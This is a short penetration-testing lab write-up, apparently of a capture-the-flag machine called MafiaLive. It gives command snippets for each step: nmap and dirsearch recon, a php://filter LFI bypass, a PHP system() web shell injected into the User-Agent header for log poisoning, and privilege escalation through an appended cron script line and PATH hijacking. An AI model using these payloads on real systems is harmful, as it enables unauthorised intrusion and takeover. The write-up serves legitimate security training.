Project Overview
This hands-on penetration testing exercise involved systematically compromising the MafiaLive virtual machine through a chain of discovered vulnerabilities. The engagement simulated real-world attack scenarios where initial web application weaknesses led to complete system takeover.

Key Achievements & Insights
Successfully demonstrated how seemingly minor configuration issues can create catastrophic security chains. The exercise revealed:

Web Application Flaws: Discovered and exploited LFI vulnerabilities that bypassed naive input filtering

Defense Evasion: Used log poisoning techniques to transform LFI into full RCE capabilities

Privilege Escalation: Leveraged misconfigured cron jobs for horizontal movement and PATH hijacking for vertical escalation

Persistence: Established alternative access methods through SSH key injection

Technical Execution
Phase 1: Reconnaissance & Initial Access
bash
Discovering the attack surface
nmap -Pn -sC -sV -A -T4 -p- target_ip
dirsearch -u http://mafialive.thm/
Phase 2: Web Vulnerability Exploitation
bash
Bypassing LFI filters with encoding tricks
view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

Chaining LFI with log poisoning for RCE
User-Agent: <?php system($_GET['c']); ?>
Phase 3: Privilege Escalation Chain
bash
 Horizontal movement via cron job manipulation
echo "chmod 777 /home/archangel/secret" >> /opt/helloworld.sh

 Vertical escalation through PATH manipulation
echo "/bin/bash" > /tmp/cp && chmod 777 /tmp/cp
export PATH=/tmp:$PATH
/home/archangel/secret/backup
Professional Takeaways
This exercise highlighted critical security principles: the danger of improper input validation, risks of writable system scripts, and the importance of absolute path usage in privileged binaries. Each vulnerability, while seemingly isolated, created a domino effect leading to complete system compromise - a powerful reminder of defense-in-depth necessity in modern security architecture.
